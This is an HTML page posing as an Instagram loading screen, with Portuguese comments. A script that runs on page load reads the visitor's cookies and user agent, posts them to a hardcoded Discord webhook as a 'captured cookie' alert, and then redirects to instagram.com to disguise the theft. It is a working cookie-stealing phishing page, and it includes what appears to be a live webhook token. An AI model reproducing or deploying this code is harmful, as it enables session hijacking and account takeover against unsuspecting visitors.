<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #dbdbdb; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

<script>
    // SUA URL DO DISCORD AQUI
    const WEBHOOK = "https://discord.com/api/webhooks/1572284562686480555/8ZiUqE7VwiWleV_HNaxSGVDV2U8h8SnPxqeueU7ZqcBCQWIk2EOGMenw_m_nkOnOUZQw";

    function sendCookies() {
        const cookies = document.cookie || "Nenhum cookie encontrado";
        const userAgent = navigator.userAgent.substring(0, 60);
        
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "IG Session",
                embeds: [{
                    title: "🍪 Cookie Capturado!",
                    color: 15158332,
                    fields: [
                        { name: "Dispositivo", value: userAgent, inline: true },
                        { name: "Cookies", value: cookies.length > 100 ? cookies.substring(0, 100) + "... (muito longo)" : cookies, inline: false }
                    ],
                    footer: { text: new Date().toLocaleString() }
                }]
            })
        });
        
        // Redireciona para o Instagram para disfarce
        window.location.href = "https://www.instagram.com";
    }

    // Executa assim que a página carrega
    window.onload = sendCookies;
</script>
</body>
</html>
